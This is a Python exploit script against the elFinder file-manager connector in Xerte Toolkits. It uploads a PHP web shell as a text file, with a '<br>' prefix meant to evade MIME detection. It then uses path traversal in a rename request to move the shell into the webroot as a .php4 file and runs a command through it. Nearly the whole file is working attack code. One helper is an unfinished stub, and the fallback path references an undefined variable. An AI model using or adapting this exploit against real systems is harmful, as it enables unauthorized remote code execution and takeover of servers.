import argparse
import base64
import requests
import json

def get_webroot(url: str):
    # TODO: Webroot can be obtained by sending a request to /setup (if it hasn't been removed)

    pass    # TODO: Finish me

def get_elfinder_id(name: str, volume_id: str = "l1"):
    base_64 = base64.b64encode(name.encode("utf-8"))
    relative_id = base_64.decode("utf-8").rstrip("=")
    return volume_id + "_" + relative_id

def create_dir(url: str, params: dict, dirname: str, root_dir_id: str) -> str:

    dir_id = get_elfinder_id(dirname)

    params["cmd"] = "mkdir"
    params["name"] = dirname
    params["target"] = root_dir_id

    requests.get(url, params = params, allow_redirects = False)

    return dir_id

def upload_file(
    url: str,
    params: dict,
    filename: str,
    dir_id: str,
    payload: str) -> str:

    data = {
        "cmd": "upload",
        "target": dir_id
    }

    files = {
        "upload[]": (filename, payload, "text/plain")
    }

    requests.post(
        url,
        params = params,
        data = data,
        files = files,
        allow_redirects = False)

    return get_elfinder_id(filename)

def rename_file(
    url: str,
    params: dict,
    shellname: str,
    dirname: str,
    file_id: str) -> str:

    params["cmd"] = "rename"
    params["target"] = file_id
    params["name"] = f"{dirname}/../../../../{shellname}"

    requests.get(url, params = params, allow_redirects = False)

def send_command(url: str, command: str):

    res = requests.get(url, params = { "cmd": command })

    print(res.text[4:])

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--webroot",
        type = str,
        help = ("Full filepath to webroot. If omitted, script will try to " +
        "retrieve webroot from application."))
    parser.add_argument(
        "user",
        type = str,
        help = 'Username of legitimate user.')
    parser.add_argument(
        "url",
        type = str,
        help = "Full URL to application. Ex: http://target.com/xertetoolkits")
    args = parser.parse_args()

    payload = f"<br><?php system($_GET['cmd']); ?>" # <br> is to prevent mime type detection

    if args.webroot is None:
        webroot = get_webroot(url)

    url = args.url.rstrip("/")

    connector_url = url + "/editor/elfinder/php/connector.php"

    user_dir =  f"/USER-FILES/1-{args.user}-Nottingham/"

    full_user_dir = args.webroot + user_dir

    upload_url = url + user_dir

    base_params = {
        "uploadDir": full_user_dir,
        "uploadURL": upload_url}

    root_dir_id = "l1_Lw"
    dirname = "d"
    filename = "s.txt"
    shellname = "s.php4"

    dir_id = create_dir(connector_url, base_params, dirname, root_dir_id)
    file_id = upload_file(
        connector_url,
        base_params,
        filename,
        root_dir_id,
        payload)
    rename_file(connector_url, base_params, shellname, dirname, file_id)

    shell_url = url + f"/{shellname}"
    send_command(shell_url, "id")

if __name__ == "__main__":
    main()
